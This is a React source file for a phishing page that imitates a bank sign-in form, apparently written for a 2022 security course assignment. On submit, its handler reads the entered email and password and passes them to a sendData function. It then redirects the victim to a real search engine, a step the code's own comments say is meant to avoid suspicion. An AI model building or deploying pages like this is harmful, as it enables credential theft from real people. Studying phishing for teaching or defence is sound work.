import './App.css'
import './signin.css'
import { sendData } from '../services/ApiServices';


// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// START-UP
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
function App() {

  // The genuine website address to redirect the user (avoids suspicions) :
  const redirectUrl = 'https://duckduckgo.com/';  

  // Website button click event :
  const handleClick2 = () => {

    var input_email     = document.getElementById('floatingInput').value
    var input_password  = document.getElementById('floatingPassword').value

    // Save data only if inputs are available :
    if(input_email != "" && input_password !="" && input_email.includes("@"))
    {
      sendData(input_email,input_password);
    }  
  };

  

  return (

    <div className="d-flex flex-column h-100">

          {/* NAVBAR */}
          <nav className="navbar navbar-light bg-light mb-5">
            <a className="navbar-brand" href="/">

              {/* NOTE: Used braille space character */}
              ⠀
              <img src="./src/assets/globe.svg" width="40" height="40" className="d-inline-block align-top" alt=""/>
              ⠀BANK WEBSITE

            </a>
          </nav>


          {/* SIGN-IN FORM */}
          <main className="form-signin">

            <form action={redirectUrl} method="get">

              {/* PICTURE */}
              <img className="mb-4" src="./src/assets/vault2.svg" alt="" width="100" height="100"/>


              {/* LABEL */}
              <h1 className="h3 mb-4 fw-normal">Please sign in</h1>


              {/* EMAIL TEXTBOX */}
              <div className="form-floating mb-3">
                <input type="email" className="form-control" id="floatingInput" placeholder="name@example.com" required='required'></input>
                <label htmlFor="floatingInput">Email address</label>
              </div>
              

              {/* PASSWORD TEXTBOX */}
              <div className="form-floating mb-3">
                <input type="password" className="form-control" id="floatingPassword" placeholder="Password" required='required'></input>
                <label htmlFor="floatingPassword">Password</label>
              </div>


              {/* SIGN-IN BUTTON */}
              <button className="w-100 btn btn-lg btn-primary mb-5" type="submit" onClick={handleClick2} >Sign in</button>

            </form>

          </main>



          {/* FOOTER */}
          <footer className="footer py-3 bg-light mt-auto">
            <div className="container">
              <span className="text-muted">&copy; CCSEP ASSIGNMENT 2022</span>
            </div>
          </footer>

    </div>
  )
}

export default App